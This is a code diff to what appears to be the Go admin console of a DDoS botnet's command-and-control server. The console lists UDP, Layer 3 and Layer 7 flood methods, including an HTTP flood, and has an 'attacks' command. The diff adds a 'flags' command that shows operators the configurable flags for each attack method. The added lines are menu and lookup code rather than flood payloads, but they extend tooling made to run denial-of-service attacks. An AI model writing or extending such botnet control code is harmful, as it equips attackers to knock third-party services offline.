@@ -478,6 +478,7 @@ func Admin(conn net.Conn) {
 				{"methods_udp", ansiCommands + "View all UDP methods available" + ansiReset},
 				{"methods_l3", ansiCommands + "View all Layer 3 methods available" + ansiReset},
 				{"methods_l7", ansiCommands + "View all Layer 7 methods available" + ansiReset},
+				{"flags <.method>", ansiCommands + "View attack flags for a specific method" + ansiReset},
 				{"clear", ansiCommands + "Clears your terminal and history" + ansiReset},
 			}
 			writeGradientTable(session.Conn, []string{"Command", "Description"}, rows)
@@ -554,6 +555,54 @@ func Admin(conn net.Conn) {
 				{".http", ansiCommands + "HTTP flood (Layer 7)" + ansiReset},
 			}
 			writeGradientTable(session.Conn, []string{"Layer 7 Methods", "Description"}, rows)
+
+		case "flags":
+			args := strings.Fields(command)[1:]
+			if len(args) == 0 {
+				session.Conn.Write([]byte(ansiSystem + "Usage: flags <method>\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Example" + ansiReset + ": flags .http\r\n"))
+				continue
+			}
+
+			methodName := args[0]
+			lookupName := methodName
+			if !strings.HasPrefix(methodName, ".") {
+				lookupName = "." + methodName
+			}
+			method, ok := Methods[lookupName]
+			if !ok {
+				method, ok = Methods[methodName]
+				if !ok {
+					session.Conn.Write([]byte(ansiError + "Unknown method: " + methodName + ansiReset + "\r\n"))
+					continue
+				}
+			}
+
+			var rows [][]string
+			for _, flagID := range method.Flags {
+				var flagName, description string
+				for name, f := range Flags {
+					if f.ID == flagID {
+						flagName = name
+						description = f.Description
+						break
+					}
+				}
+				if flagName == "" {
+					flagName = fmt.Sprintf("id:%d", flagID)
+					description = "Unknown flag"
+				}
+				// Pasamos solo texto plano; writeGradientTable se encarga del color
+				rows = append(rows, []string{flagName, description})
+			}
+
+			if len(rows) == 0 {
+				session.Conn.Write([]byte(ansiWarning + "No flags defined for this method.\r\n" + ansiReset))
+				continue
+			}
+
+			headers := []string{"Flag", "Description"}
+			writeGradientTable(session.Conn, headers, rows)
 
 		case "attacks":
 			args := strings.Split(strings.ToLower(command), " ")[1:]
